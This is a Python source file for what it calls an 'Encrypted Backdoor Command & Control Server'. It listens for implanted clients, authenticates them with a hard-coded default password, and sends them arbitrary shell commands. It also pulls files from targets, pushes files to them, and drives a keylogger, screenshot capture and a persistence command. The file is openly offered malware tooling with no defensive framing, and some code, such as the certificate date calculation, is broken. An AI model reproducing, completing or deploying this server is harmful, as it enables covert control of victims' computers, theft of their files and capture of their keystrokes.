import socket
import threading
import os
import sys
import time
import hmac
import hashlib
import ssl
import base64
import json
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

# Text colors for the terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class EncryptedBackdoorServer:
    def __init__(self, host="0.0.0.0", port=4444, password=""):
        self.host = host
        self.port = port
        self.socket = None
        self.clients = {}  # Dictionary to store client connections {addr: (socket, info, cipher)}
        self.current_client = None
        self.prompt = f"{Colors.BLUE}[*]{Colors.ENDC} Encrypted C2> "
        self.running = False
        self.command_history = []
        self.password = password
        self.hmac_secret = b"supersecret_hmac_key_123"
        
        # Initialize encryption
        self.key = self._generate_key_from_password(password)
        
    def _generate_key_from_password(self, password):
        """Generate a Fernet key from a password using PBKDF2"""
        password = password.encode()
        salt = b'security_salt_value'  # In production, use a random salt and store it
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key
        
    def start(self):
        """Start the server with SSL/TLS support"""
        # Create a standard socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            # Bind to the address and port
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            print(f"{Colors.GREEN}[+]{Colors.ENDC} Encrypted server started on {self.host}:{self.port}")
            print(f"{Colors.GREEN}[+]{Colors.ENDC} Waiting for incoming connections...\n")
            
            # Start a thread to handle new connections
            listener_thread = threading.Thread(target=self._accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            # Main loop for command input
            self._command_loop()
            
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error starting server: {str(e)}")
            self.stop()
    
    def _accept_connections(self):
        """Accept incoming connections with authentication"""
        while self.running:
            try:
                client_socket, client_address = self.socket.accept()
                
                # Try to upgrade connection to SSL/TLS
                try:
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    
                    # In production, use proper certificates
                    # context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
                    
                    # For testing, generate temporary certificates
                    import tempfile
                    certfile = tempfile.NamedTemporaryFile(delete=False)
                    keyfile = tempfile.NamedTemporaryFile(delete=False)
                    
                    from cryptography.hazmat.primitives.asymmetric import rsa
                    from cryptography.hazmat.primitives import serialization
                    from cryptography import x509
                    from cryptography.x509.oid import NameOID
                    from cryptography.hazmat.primitives import hashes
                    
                    # Generate private key
                    key = rsa.generate_private_key(
                        public_exponent=65537,
                        key_size=2048
                    )
                    
                    # Write key to file
                    key_bytes = key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.PKCS8,
                        encryption_algorithm=serialization.NoEncryption()
                    )
                    keyfile.write(key_bytes)
                    keyfile.close()
                    
                    # Generate cert
                    subject = issuer = x509.Name([
                        x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
                        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"CA"),
                        x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
                        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Test Corporation"),
                        x509.NameAttribute(NameOID.COMMON_NAME, u"test.local"),
                    ])
                    cert = x509.CertificateBuilder().subject_name(
                        subject
                    ).issuer_name(
                        issuer
                    ).public_key(
                        key.public_key()
                    ).serial_number(
                        x509.random_serial_number()
                    ).not_valid_before(
                        datetime.utcnow()
                    ).not_valid_after(
                        datetime.utcnow() + datetime.timedelta(days=365)
                    ).add_extension(
                        x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
                        critical=False,
                    ).sign(key, hashes.SHA256())
                    
                    cert_bytes = cert.public_bytes(serialization.Encoding.PEM)
                    certfile.write(cert_bytes)
                    certfile.close()
                    
                    context.load_cert_chain(certfile=certfile.name, keyfile=keyfile.name)
                    client_socket = context.wrap_socket(client_socket, server_side=True)
                    
                    # Clean up temp files
                    os.unlink(certfile.name)
                    os.unlink(keyfile.name)
                    
                except Exception as e:
                    print(f"{Colors.WARNING}[!]{Colors.ENDC} SSL error, using regular socket: {e}")
                
                # Challenge the client for authentication
                client_socket.send(b"AUTH")
                password_attempt = client_socket.recv(1024)
                
                if password_attempt.decode() != self.password:
                    client_socket.send(b"Access denied")
                    client_socket.close()
                    print(f"{Colors.FAIL}[-]{Colors.ENDC} Authentication failed from {client_address[0]}:{client_address[1]}")
                    continue
                
                # Authentication successful
                client_socket.send(b"Access granted")
                
                # Initialize cipher for this client
                cipher = Fernet(self.key)
                
                # Receive encrypted system info
                encrypted_info = client_socket.recv(4096)
                system_info = cipher.decrypt(encrypted_info).decode()
                
                # Store the connection with its encryption
                addr_str = f"{client_address[0]}:{client_address[1]}"
                self.clients[addr_str] = (client_socket, system_info, cipher)
                
                print(f"\n{Colors.GREEN}[+]{Colors.ENDC} New encrypted connection from {addr_str}")
                print(f"{Colors.BLUE}[*]{Colors.ENDC} System Info:\n{system_info}")
                print(self.prompt, end="", flush=True)
                
                # Start a thread to monitor this client
                monitor_thread = threading.Thread(target=self._monitor_client, 
                                              args=(client_socket, addr_str))
                monitor_thread.daemon = True
                monitor_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"{Colors.FAIL}[-]{Colors.ENDC} Error accepting connection: {str(e)}")
                    time.sleep(1)
    
    def _monitor_client(self, client_socket, addr_str):
        """Monitor client for disconnection"""
        while self.running:
            try:
                # Try sending a keep-alive packet
                if client_socket in [c[0] for c in self.clients.values()]:
                    # We're just checking if the socket is still valid
                    time.sleep(30)
            except:
                if addr_str in self.clients:
                    print(f"\n{Colors.FAIL}[-]{Colors.ENDC} Client {addr_str} disconnected")
                    try:
                        client_socket.close()
                    except:
                        pass
                    del self.clients[addr_str]
                    if self.current_client == addr_str:
                        self.current_client = None
                    print(self.prompt, end="", flush=True)
                break
    
    def _command_loop(self):
        """Main command loop for the server"""
        while self.running:
            try:
                command = input(self.prompt)
                self.command_history.append(command)
                
                if not command:
                    continue
                
                if command.lower() in ["exit", "quit"]:
                    self.stop()
                    break
                
                elif command.lower() == "help":
                    self._show_help()
                
                elif command.lower() == "list":
                    self._list_clients()
                
                elif command.lower().startswith("connect "):
                    self._connect_to_client(command[8:])
                
                elif command.lower() == "disconnect":
                    self.current_client = None
                    print(f"{Colors.BLUE}[*]{Colors.ENDC} Disconnected from current session")
                
                elif command.lower() == "clear":
                    os.system("cls" if os.name == "nt" else "clear")
                
                elif command.lower() == "history":
                    for i, cmd in enumerate(self.command_history):
                        print(f"{i}: {cmd}")
                
                elif command.lower().startswith("download "):
                    self._download_file(command[9:])
                
                elif command.lower().startswith("upload "):
                    self._upload_file(command[7:])
                
                elif command.lower() == "keylogger_status":
                    self._send_command_to_client("keylogger_dump")
                
                elif command.lower() == "screenshot" or command.lower() == "grab_screen":
                    print(f"{Colors.BLUE}[*]{Colors.ENDC} Taking screenshot and securely removing it from target...")
                    self._send_command_to_client("screenshot")
                
                elif self.current_client:
                    self._send_command_to_client(command)
                
                else:
                    print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected. Use 'connect <id>' first or 'list' to see available clients")
            
            except KeyboardInterrupt:
                print("\n")
                ans = input(f"{Colors.WARNING}[!]{Colors.ENDC} Do you want to exit? (y/n): ").lower()
                if ans == "y":
                    self.stop()
                    break
            
            except Exception as e:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Error: {str(e)}")
    
    def _show_help(self):
        """Show help menu with additional encrypted commands"""
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.ENDC}
{Colors.GREEN}help{Colors.ENDC}                Show this help menu
{Colors.GREEN}list{Colors.ENDC}                List all connected clients
{Colors.GREEN}connect <id>{Colors.ENDC}        Connect to a specific client
{Colors.GREEN}disconnect{Colors.ENDC}          Disconnect from the current session
{Colors.GREEN}clear{Colors.ENDC}               Clear the screen
{Colors.GREEN}history{Colors.ENDC}             Show command history
{Colors.GREEN}download <file>{Colors.ENDC}     Download a file from the client
{Colors.GREEN}upload <file>{Colors.ENDC}       Upload a file to the client
{Colors.GREEN}sysinfo{Colors.ENDC}             Get system information
{Colors.GREEN}persist{Colors.ENDC}             Install persistence mechanism
{Colors.GREEN}screenshot{Colors.ENDC}          Take screenshot and securely delete it from target (alias: grab_screen)
{Colors.GREEN}keylogger_start{Colors.ENDC}     Start keylogger
{Colors.GREEN}keylogger_stop{Colors.ENDC}      Stop keylogger
{Colors.GREEN}keylogger_dump{Colors.ENDC}      Dump keylogger data
{Colors.GREEN}keylogger_status{Colors.ENDC}    Check keylogger status
{Colors.GREEN}<command>{Colors.ENDC}           Execute a shell command on the client
{Colors.GREEN}exit/quit{Colors.ENDC}           Exit the C2 server

{Colors.BOLD}Security Info:{Colors.ENDC}
- All communications are encrypted with AES-128 (Fernet)
- HMAC authentication for message integrity
- Password-based authentication
- Files (like screenshots) are securely deleted after transfer
"""
        print(help_text)
    
    def _list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No clients connected")
            return
        
        print(f"\n{Colors.BOLD}Connected Clients:{Colors.ENDC}")
        for i, (addr, (_, info, _)) in enumerate(self.clients.items()):
            # Extract and display relevant info
            system_info = ""
            user_info = ""
            for line in info.split('\n'):
                if 'System:' in line:
                    system_info = line.strip()
                if 'User:' in line:
                    user_info = line.strip()
            
            current = f" {Colors.GREEN}(current){Colors.ENDC}" if addr == self.current_client else ""
            print(f"[{i}] {addr}{current}")
            print(f"    {system_info} | {user_info}")
        print()
    
    def _connect_to_client(self, client_id):
        """Connect to a specific client"""
        try:
            if not self.clients:
                print(f"{Colors.WARNING}[!]{Colors.ENDC} No clients connected")
                return
            
            client_id = client_id.strip()
            
            # Check if client_id is a direct IP:port address
            if client_id in self.clients:
                self.current_client = client_id
                print(f"{Colors.GREEN}[+]{Colors.ENDC} Connected to {client_id}")
                return
            
            # Otherwise treat as an index number
            try:
                index = int(client_id)
                if 0 <= index < len(self.clients):
                    self.current_client = list(self.clients.keys())[index]
                    print(f"{Colors.GREEN}[+]{Colors.ENDC} Connected to {self.current_client}")
                else:
                    print(f"{Colors.FAIL}[-]{Colors.ENDC} Invalid client index")
            except ValueError:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Invalid client identifier")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error connecting to client: {str(e)}")
    
    def _send_command_to_client(self, command):
        """Send an encrypted command to the current client"""
        if not self.current_client:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected")
            return
        
        if self.current_client not in self.clients:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Client disconnected")
            self.current_client = None
            return
        
        try:
            client_socket, _, cipher = self.clients[self.current_client]
            
            # Encrypt the command
            encrypted_command = cipher.encrypt(command.encode())
            
            # Generate HMAC for the encrypted command
            command_hmac = hmac.new(self.hmac_secret, encrypted_command, hashlib.sha256).hexdigest().encode()
            
            # Send the command with its HMAC
            client_socket.send(encrypted_command + b"|HMAC|" + command_hmac)
            
            # Receive the encrypted response with HMAC
            encrypted_data = client_socket.recv(8192)
            
            # Split HMAC and encrypted response
            try:
                encrypted_response, received_hmac = encrypted_data.split(b"|HMAC|")
                
                # Verify HMAC
                expected_hmac = hmac.new(self.hmac_secret, encrypted_response, hashlib.sha256).hexdigest().encode()
                if not hmac.compare_digest(received_hmac, expected_hmac):
                    print(f"{Colors.FAIL}[-]{Colors.ENDC} HMAC verification failed! Message may have been tampered with.")
                    return
                
                # Decrypt the response
                response = cipher.decrypt(encrypted_response).decode()
                print(response)
                
            except Exception as e:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Error decrypting response: {str(e)}")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error communicating with client: {str(e)}")
            # Client might have disconnected
            if self.current_client in self.clients:
                del self.clients[self.current_client]
            self.current_client = None
    
    def _download_file(self, file_path):
        """Download an encrypted file from the client"""
        if not self.current_client:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected")
            return
        
        try:
            client_socket, _, cipher = self.clients[self.current_client]
            
            # Send download command
            self._send_command_to_client(f"download {file_path}")
            
            # Receive the encrypted file info with HMAC
            encrypted_info_data = client_socket.recv(4096)
            encrypted_info, info_hmac = encrypted_info_data.split(b"|HMAC|")
            
            # Verify HMAC
            expected_hmac = hmac.new(self.hmac_secret, encrypted_info, hashlib.sha256).hexdigest().encode()
            if not hmac.compare_digest(info_hmac, expected_hmac):
                print(f"{Colors.FAIL}[-]{Colors.ENDC} HMAC verification failed! File info may have been tampered with.")
                return
            
            # Decrypt file info
            file_info = cipher.decrypt(encrypted_info).decode()
            
            if file_info.startswith("Error"):
                print(f"{Colors.FAIL}[-]{Colors.ENDC} {file_info}")
                return
            
            if file_info.startswith("FILE:"):
                # Parse file info
                _, filename, size = file_info.split(":", 2)
                size = int(size)
                
                print(f"{Colors.BLUE}[*]{Colors.ENDC} Downloading: {filename} ({size} bytes)")
                
                # Send ready signal
                client_socket.send(b"READY")
                
                # Receive file data in chunks
                file_data = b""
                bytes_received = 0
                
                while True:
                    chunk_data = client_socket.recv(8192)
                    
                    if chunk_data == b"EOF":
                        break
                    
                    try:
                        encrypted_chunk, chunk_hmac = chunk_data.split(b"|HMAC|")
                        
                        # Verify chunk HMAC
                        expected_hmac = hmac.new(self.hmac_secret, encrypted_chunk, hashlib.sha256).hexdigest().encode()
                        if not hmac.compare_digest(chunk_hmac, expected_hmac):
                            print(f"{Colors.FAIL}[-]{Colors.ENDC} HMAC verification failed! Chunk may have been tampered with.")
                            return
                        
                        # Decrypt the chunk
                        decrypted_chunk = cipher.decrypt(encrypted_chunk)
                        file_data += decrypted_chunk
                        bytes_received += len(decrypted_chunk)
                        
                        # Print progress
                        progress = int((bytes_received / size) * 20)
                        bar = "[" + "=" * progress + " " * (20 - progress) + "]"
                        percent = int((bytes_received / size) * 100)
                        print(f"\r{Colors.BLUE}[*]{Colors.ENDC} {bar} {percent}%", end="", flush=True)
                        
                        # Send acknowledgment
                        client_socket.send(b"ACK")
                        
                    except Exception as e:
                        print(f"\n{Colors.FAIL}[-]{Colors.ENDC} Error processing chunk: {str(e)}")
                        return
                
                # Save the file
                os.makedirs("downloads", exist_ok=True)
                save_path = os.path.join("downloads", filename)
                
                with open(save_path, "wb") as f:
                    f.write(file_data)
                
                print(f"\n{Colors.GREEN}[+]{Colors.ENDC} File saved to {save_path}")
            
            else:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Unexpected response: {file_info}")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error downloading file: {str(e)}")
    
    def _upload_file(self, file_path):
        """Upload an encrypted file to the client"""
        if not self.current_client:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected")
            return
        
        try:
            client_socket, _, cipher = self.clients[self.current_client]
            
            if not os.path.exists(file_path):
                print(f"{Colors.FAIL}[-]{Colors.ENDC} File not found: {file_path}")
                return
            
            # Get the file data
            with open(file_path, "rb") as f:
                file_data = f.read()
            
            # Send upload command
            self._send_command_to_client(f"upload {os.path.basename(file_path)}")
            
            # Wait for client to be ready
            response = client_socket.recv(1024).decode()
            if response != "READY":
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Client not ready: {response}")
                return
            
            # Send encrypted file size with HMAC
            file_size = len(file_data)
            encrypted_size = cipher.encrypt(str(file_size).encode())
            size_hmac = hmac.new(self.hmac_secret, encrypted_size, hashlib.sha256).hexdigest().encode()
            client_socket.send(encrypted_size + b"|HMAC|" + size_hmac)
            
            # Wait for acknowledgment
            response = client_socket.recv(1024).decode()
            if response != "SIZE_RECEIVED":
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Error sending file size: {response}")
                return
            
            # Send file data in encrypted chunks
            chunk_size = 512 * 1024  # 512KB chunks
            bytes_sent = 0
            
            for i in range(0, len(file_data), chunk_size):
                chunk = file_data[i:i+chunk_size]
                
                # Encrypt the chunk
                encrypted_chunk = cipher.encrypt(chunk)
                
                # Generate HMAC for the encrypted chunk
                chunk_hmac = hmac.new(self.hmac_secret, encrypted_chunk, hashlib.sha256).hexdigest().encode()
                
                # Send the chunk with HMAC
                client_socket.send(encrypted_chunk + b"|HMAC|" + chunk_hmac)
                
                # Update progress
                bytes_sent += len(chunk)
                progress = int((bytes_sent / file_size) * 20)
                bar = "[" + "=" * progress + " " * (20 - progress) + "]"
                percent = int((bytes_sent / file_size) * 100)
                print(f"\r{Colors.BLUE}[*]{Colors.ENDC} {bar} {percent}%", end="", flush=True)
                
                # Wait for acknowledgment
                response = client_socket.recv(1024).decode()
                if response != "CHUNK_RECEIVED":
                    print(f"\n{Colors.FAIL}[-]{Colors.ENDC} Error sending chunk: {response}")
                    return
            
            # Send end-of-file marker
            client_socket.send(b"EOF")
            
            # Get final confirmation
            encrypted_data = client_socket.recv(4096)
            encrypted_response, received_hmac = encrypted_data.split(b"|HMAC|")
            
            # Verify HMAC
            expected_hmac = hmac.new(self.hmac_secret, encrypted_response, hashlib.sha256).hexdigest().encode()
            if hmac.compare_digest(received_hmac, expected_hmac):
                response = cipher.decrypt(encrypted_response).decode()
                print(f"\n{Colors.GREEN}[+]{Colors.ENDC} {response}")
            else:
                print(f"\n{Colors.FAIL}[-]{Colors.ENDC} HMAC verification failed for final response")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error uploading file: {str(e)}")
    
    def stop(self):
        """Stop the server safely"""
        self.running = False
        
        # Close all client connections
        for addr, (client_socket, _, _) in self.clients.items():
            try:
                # Try to tell the client to exit gracefully
                if client_socket:
                    try:
                        cipher = Fernet(self.key)
                        exit_command = cipher.encrypt(b"exit")
                        exit_hmac = hmac.new(self.hmac_secret, exit_command, hashlib.sha256).hexdigest().encode()
                        client_socket.send(exit_command + b"|HMAC|" + exit_hmac)
                    except:
                        pass
                    time.sleep(0.5)
                    client_socket.close()
            except:
                pass
        
        self.clients.clear()
        
        # Close the server socket
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print(f"{Colors.GREEN}[+]{Colors.ENDC} Server stopped safely")


if __name__ == "__main__":
    banner = f"""
{Colors.BOLD}{Colors.HEADER}================================================{Colors.ENDC}
{Colors.BOLD}{Colors.HEADER}    Encrypted Backdoor Command & Control Server {Colors.ENDC}
{Colors.BOLD}{Colors.HEADER}================================================{Colors.ENDC}
{Colors.BLUE}[*]{Colors.ENDC} All communications are AES-encrypted with HMAC verification
{Colors.BLUE}[*]{Colors.ENDC} Type 'help' for available commands
"""
    print(banner)
    
    # Parse command line arguments for custom port and password
    import argparse
    parser = argparse.ArgumentParser(description="Start the encrypted backdoor C2 server")
    parser.add_argument("-p", "--port", help="Port to listen on (default: 4444)", type=int, default=4444)
    parser.add_argument("--password", help="Authentication password (default: P@55w0rd!)", default="P@55w0rd!")
    parser.add_argument("--host", help="Host to bind to (default: 0.0.0.0)", default="0.0.0.0")
    parser.add_argument("--save-config", help="Save configuration to file", action="store_true")
    
    args = parser.parse_args()
    
    # Save configuration if requested
    if args.save_config:
        config = {
            "host": args.host,
            "port": args.port,
            "password": args.password
        }
        
        # Generate a key for config encryption
        config_key = Fernet.generate_key()
        config_cipher = Fernet(config_key)
        
        # Encrypt the config
        config_json = json.dumps(config)
        encrypted_config = config_cipher.encrypt(config_json.encode())
        
        # Save the encrypted config
        with open("server_config.enc", "wb") as f:
            f.write(encrypted_config)
        
        # Save the key (in a real scenario, this would be stored securely)
        with open("server_key.txt", "wb") as f:
            f.write(config_key)
        
        print(f"{Colors.GREEN}[+]{Colors.ENDC} Configuration saved to server_config.enc")
        print(f"{Colors.WARNING}[!]{Colors.ENDC} Encryption key saved to server_key.txt (keep this secure!)")
    
    # Start the server
    server = EncryptedBackdoorServer(host=args.host, port=args.port, password=args.password)
    server.start() 
